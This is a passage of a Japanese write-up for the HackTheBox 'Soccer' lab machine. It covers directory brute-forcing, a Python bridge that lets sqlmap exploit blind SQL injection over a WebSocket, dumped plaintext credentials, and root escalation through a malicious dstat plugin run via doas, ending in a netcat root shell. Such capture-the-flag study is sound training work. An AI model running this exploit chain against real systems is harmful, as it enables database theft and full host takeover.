        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}

```

メインページ？は特にsoccer.htbと変わりない
- しかし、上のバナーがHomeの他にMatch Login Sginupと増えている
![](https://i.imgur.com/hpjA2MW.jpeg)



#### feroxbuster
```sh
└─$ feroxbuster -u http://soc-player.soccer.htb/                                                                                                      
                                                                                                                                                                     
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://soc-player.soccer.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET       10l       16w      173c http://soc-player.soccer.htb/css => http://soc-player.soccer.htb/css/
301      GET       10l       16w      171c http://soc-player.soccer.htb/js => http://soc-player.soccer.htb/js/
302      GET        1l        4w       23c http://soc-player.soccer.htb/logout => http://soc-player.soccer.htb/
301      GET       10l       16w      173c http://soc-player.soccer.htb/img => http://soc-player.soccer.htb/img/
200      GET       98l      216w     3307c http://soc-player.soccer.htb/login
200      GET      104l      229w     3741c http://soc-player.soccer.htb/signup
200      GET      403l      706w    10078c http://soc-player.soccer.htb/match
200      GET      494l     1440w    96128c http://soc-player.soccer.htb/img/ground3.jpg
200      GET        7l     1223w    80496c http://soc-player.soccer.htb/js/bootstrap.bundle.min.js
200      GET        2l     1294w    89501c http://soc-player.soccer.htb/js/jquery.min.js
200      GET       98l      216w     3307c http://soc-player.soccer.htb/Login
200      GET        7l     1608w   140930c http://soc-player.soccer.htb/css/bootstrap.min.css
200      GET     2232l     4070w   223875c http://soc-player.soccer.htb/img/ground4.jpg
200      GET      711l     4253w   403502c http://soc-player.soccer.htb/img/ground2.jpg
200      GET      809l     5093w   490253c http://soc-player.soccer.htb/img/ground1.jpg
200      GET     1307l     7814w   695864c http://soc-player.soccer.htb/img/football.jpg
200      GET      157l      535w     6749c http://soc-player.soccer.htb/
200      GET        1l        6w       31c http://soc-player.soccer.htb/check
200      GET      335l     1999w   161545c http://soc-player.soccer.htb/img/nepal.jpg
200      GET      422l     2279w   180268c http://soc-player.soccer.htb/img/spain.png
200      GET      511l     3123w   235985c http://soc-player.soccer.htb/img/afgha.jpg
200      GET      480l     2688w   240674c http://soc-player.soccer.htb/img/sweden.jpg
302      GET        1l        4w       23c http://soc-player.soccer.htb/Logout => http://soc-player.soccer.htb/
200      GET      104l      229w     3741c http://soc-player.soccer.htb/Signup
200      GET      104l      229w     3741c http://soc-player.soccer.htb/SignUp
200      GET        1l        6w       31c http://soc-player.soccer.htb/Check
200      GET       98l      216w     3307c http://soc-player.soccer.htb/LOGIN
[####################] - 2m    120024/120024  0s      found:27      errors:1      
[####################] - 2m     30000/30000   217/s   http://soc-player.soccer.htb/ 
[####################] - 2m     30000/30000   218/s   http://soc-player.soccer.htb/js/ 
[####################] - 2m     30000/30000   217/s   http://soc-player.soccer.htb/css/ 
[####################] - 2m     30000/30000   218/s   http://soc-player.soccer.htb/img/                                                                                                                                                                        
```


サインアップ、ログインしてから、`http://soc-player.soccer.htb/check`にアクセスすると、以下のような入力フォームがある
![](https://i.imgur.com/3WzRqHT.jpeg)

この入力フォームについて詳しく見ると、websocketで通信していることがわかる
![](https://i.imgur.com/2M26YqY.png)

直接websocketを介して、ws://soc-player.soccer.htb:9091と通信できる
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Soccer]
└─$ wscat -H "Cookie: connect.sid=s%3AGkIrCdSRQlhuyVRi3TAU2FEFSIVZSet8.QTx29qm%2FLtMlr6g4%2BfL%2BJ1L12lw64WmdieI6AkeMC4Y" -c ws://soc-player.soccer.htb:9091/
Connected (press CTRL+C to quit)
> hi
< Ticket Doesn't Exist
> test
< Ticket Doesn't Exist
> help
< Ticket Doesn't Exist
> 88763
< Ticket Doesn't Exist
> 88673
< Ticket Doesn't Exist

```


## SQLMap
SQLインジェクションの可能性があるので、SQLMapを実行したい
しかし、WebSocketは、HTTPのように、そのままcurlのコマンド例のまま使えない
なので、以下の記事に従って、中間サーバをpythonで作って WebSocket に橋渡しすることで、SQLmapは、中間サーバーにアクセスさせる
- https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

middleware.py
```sh
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://soc-player.soccer.htb:9091/"

def send_ws(payload):
    ws = create_connection(ws_server)
    message = unquote(payload).replace('"','\'') # escape JSON
    data = '{"id":"%s"}' % message
    ws.send(data)
    resp = ws.recv()
    ws.close()
    return resp or ''

def middleware_server(host_port,content_type="text/plain"):
    class CustomHandler(SimpleHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            try:
                payload = urlparse(self.path).query.split('=',1)[1]
            except IndexError:
                payload = False

            content = send_ws(payload) if payload else 'No parameters specified!'
            self.send_header("Content-type", content_type)
            self.end_headers()
            self.wfile.write(content.encode())
            return

    class _TCPServer(TCPServer):
        allow_reuse_address = True

    httpd = _TCPServer(host_port, CustomHandler)
    httpd.serve_forever()

print("[+] Starting MiddleWare Server on :8081")
print("[+] Send payloads like: http://localhost:8081/?id=1")

try:
    middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
    pass
```

ライブラリインストール
```sh
pip3 install websocket-client
```

実行
```sh
python3 middleware.py
```

SQLMapでSQLインジェクションを行う
```sh
sqlmap -u "http://localhost:8081/?id=1" --batch --dbs --level 5 --risk 3
```

実行結果
- Mysqlで、以下の5つのテーブルがあることがわかった
- information_schema
- mysql
- performance_schema
- soccer_db
- sys

```sh
<SNIP>

23:50:48] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[23:50:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[23:51:01] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[23:51:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[23:51:01] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[23:51:24] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[23:51:43] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[23:51:43] [INFO] testing 'Generic UNION query (56) - 21 to 40 columns'
[23:51:59] [INFO] testing 'Generic UNION query (56) - 41 to 60 columns'
[23:52:15] [INFO] testing 'Generic UNION query (56) - 61 to 80 columns'
[23:52:30] [INFO] testing 'Generic UNION query (56) - 81 to 100 columns'
[23:52:46] [INFO] testing 'MySQL UNION query (56) - 1 to 20 columns'
[23:53:16] [INFO] testing 'MySQL UNION query (56) - 21 to 40 columns'
[23:53:32] [INFO] testing 'MySQL UNION query (56) - 41 to 60 columns'
[23:53:49] [INFO] testing 'MySQL UNION query (56) - 61 to 80 columns'
[23:54:09] [INFO] testing 'MySQL UNION query (56) - 81 to 100 columns'
[23:54:26] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[23:54:26] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 389 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: id=-6920 OR 7918=7918

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 1813 FROM (SELECT(SLEEP(5)))EDIn)
---
[23:54:53] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[23:54:58] [INFO] fetching database names
[23:54:58] [INFO] fetching number of databases
[23:54:58] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[23:54:58] [INFO] retrieved: 5
[23:55:04] [INFO] retrieved: mysql
[23:55:39] [INFO] retrieved: information_schema
[23:57:20] [INFO] retrieved: performance_schema
[23:59:11] [INFO] retrieved: sys
[23:59:31] [INFO] retrieved: soccer_db
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys

[00:00:25] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/localhost'

[*] ending @ 00:00:25 /2025-06-10/

```

soccer_dbのテーブルを読み込む
```sh
[00:03:52] [INFO] retrieved: 1
[00:03:56] [INFO] retrieved: accounts
Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+

[00:04:39] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/localhost'

[*] ending @ 00:04:39 /2025-06-10/

```

```sh
[00:11:16] [INFO] retrieved: 1324
[00:11:42] [INFO] retrieved: PlayerOftheMatch2022
[00:13:33] [INFO] retrieved: player
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+

[00:14:09] [INFO] table 'soccer_db.accounts' dumped to CSV file '/home/kali/.local/share/sqlmap/output/localhost/dump/soccer_db/accounts.csv'
[00:14:09] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/localhost'

[*] ending @ 00:14:09 /2025-06-10/


```

playerの認証情報が得られた
### 認証情報
player  : PlayerOftheMatch2022

リバースシェルにもどって、playerに切り替える
```bash
www-data@soccer:/var$ su - player 
su - player
Password: PlayerOftheMatch2022

player@soccer:~$ 
```


---

# Privilege Escalation
Linpeas.shが実行できない
- AVが動いてる？

```sh
player@soccer:~$ sudo -l
sudo -l
[sudo] password for player: PlayerOftheMatch2022

Sorry, user player may not run sudo on localhost.

```
### /usr/local/bin/doas
権限昇格に使えそう
設定の意味は「player ユーザーはパスワードなしで（nopass）root として/usr/bin/dstat というコマンドのみを実行可能」
```sh
www-data@soccer:/$ cat /usr/local/etc/doas.conf
cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

以下の記事を参考に権限昇格できないか図る
- https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/
- /usr/bin/dstatとは？
	- システムリソースの統計情報を生成するための多用途ツール
	- ユーザーはカスタムプラグインを作成し、例えばオプションを追加することで実行できる

dtstatディレクトリを見つける
```bash
player@soccer:~$ find / -type d -name dstat 2>/dev/null
find / -type d -name dstat 2>/dev/null
/usr/share/doc/dstat
/usr/share/dstat
/usr/local/share/dstat

```

確かに、`/usr/share/dstat`にdtstatプラグインが入っていることが確認できる
```sh
player@soccer:~$ cd /usr/share/dstat
cd /usr/share/dstat
player@soccer:/usr/share/dstat$ ls
ls
__pycache__              dstat_mongodb_opcount.py      dstat_snooze.py
dstat.py                 dstat_mongodb_queue.py        dstat_squid.py
dstat_battery.py         dstat_mongodb_stats.py        dstat_test.py
dstat_battery_remain.py  dstat_mysql5_cmds.py          dstat_thermal.py
dstat_condor_queue.py    dstat_mysql5_conn.py          dstat_top_bio.py
dstat_cpufreq.py         dstat_mysql5_innodb.py        dstat_top_bio_adv.py
dstat_dbus.py            dstat_mysql5_innodb_basic.py  dstat_top_childwait.py
dstat_disk_avgqu.py      dstat_mysql5_innodb_extra.py  dstat_top_cpu.py
dstat_disk_avgrq.py      dstat_mysql5_io.py            dstat_top_cpu_adv.py
dstat_disk_svctm.py      dstat_mysql5_keys.py          dstat_top_cputime.py
dstat_disk_tps.py        dstat_mysql_io.py             dstat_top_cputime_avg.py
dstat_disk_util.py       dstat_mysql_keys.py           dstat_top_int.py
dstat_disk_wait.py       dstat_net_packets.py          dstat_top_io.py
dstat_dstat.py           dstat_nfs3.py                 dstat_top_io_adv.py
dstat_dstat_cpu.py       dstat_nfs3_ops.py             dstat_top_latency.py
dstat_dstat_ctxt.py      dstat_nfsd3.py                dstat_top_latency_avg.py
dstat_dstat_mem.py       dstat_nfsd3_ops.py            dstat_top_mem.py
dstat_fan.py             dstat_nfsd4_ops.py            dstat_top_oom.py
dstat_freespace.py       dstat_nfsstat4.py             dstat_utmp.py
dstat_fuse.py            dstat_ntp.py                  dstat_vm_cpu.py
dstat_gpfs.py            dstat_postfix.py              dstat_vm_mem.py
dstat_gpfs_ops.py        dstat_power.py                dstat_vm_mem_adv.py
dstat_helloworld.py      dstat_proc_count.py           dstat_vmk_hba.py
dstat_ib.py              dstat_qmail.py                dstat_vmk_int.py
dstat_innodb_buffer.py   dstat_redis.py                dstat_vmk_nic.py
dstat_innodb_io.py       dstat_rpc.py                  dstat_vz_cpu.py
dstat_innodb_ops.py      dstat_rpcd.py                 dstat_vz_io.py
dstat_jvm_full.py        dstat_sendmail.py             dstat_vz_ubc.py
dstat_jvm_vm.py          dstat_snmp_cpu.py             dstat_wifi.py
dstat_lustre.py          dstat_snmp_load.py            dstat_zfs_arc.py
dstat_md_status.py       dstat_snmp_mem.py             dstat_zfs_l2arc.py
dstat_memcache_hits.py   dstat_snmp_net.py             dstat_zfs_zil.py
dstat_mongodb_conn.py    dstat_snmp_net_err.py
dstat_mongodb_mem.py     dstat_snmp_sys.py

```

プラグインを作成する
`/usr/share/dstat/dstat_exploit.py`でプラグインを作成できる
```bash
import os
os.system('chmod +s /usr/bin/bash')
```

dstatは「/usr/local/share/dstat/」以下のプラグインを認識できる
でも、移動させようとすると、権限がないので、移動できない
```bash
player@soccer:/tmp$ mv dtat_exploit.py /usr/share/dstat/dtat_exploit.py
mv dtat_exploit.py /usr/share/dstat/dtat_exploit.py
mv: cannot move 'dtat_exploit.py' to '/usr/share/dstat/dtat_exploit.py': Permission denied
```

まず、書き込みができるフォルダがあるかを確認する
```sh
player@soccer:/tmp$ for dir in /usr/share/doc/dstat /usr/share/dstat /usr/local/share/dstat; do
    echo -n "$dir: "
    test -w "$dir" && echo "Writable" || echo "Not writable"
<c/dstat /usr/share/dstat /usr/local/share/dstat; do
>     echo -n "$dir: "
>     test -w "$dir" && echo "Writable" || echo "Not writable"

> done
/usr/share/doc/dstat: Not writable
/usr/share/dstat: Not writable
/usr/local/share/dstat: Writable

```

移動させる
```sh
player@soccer:/tmp$ mv dtat_exploit.py /usr/local/share/dstat/dtat_exploit.py
mv dtat_exploit.py /usr/local/share/dstat/dtat_exploit.py
```

以下の記事を参考にする
- https://qiita.com/iptracej/items/17974eb2b15c36dc168e
```bash
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.129.5.59] 57610
# ls
dtat_exploit.py
user.txt
# id
uid=0(root) gid=0(root) groups=0(root)
# 


```


### ポイント
WebSocketでも中間のサーバーをhttpで立てれば、SQLMapは使える！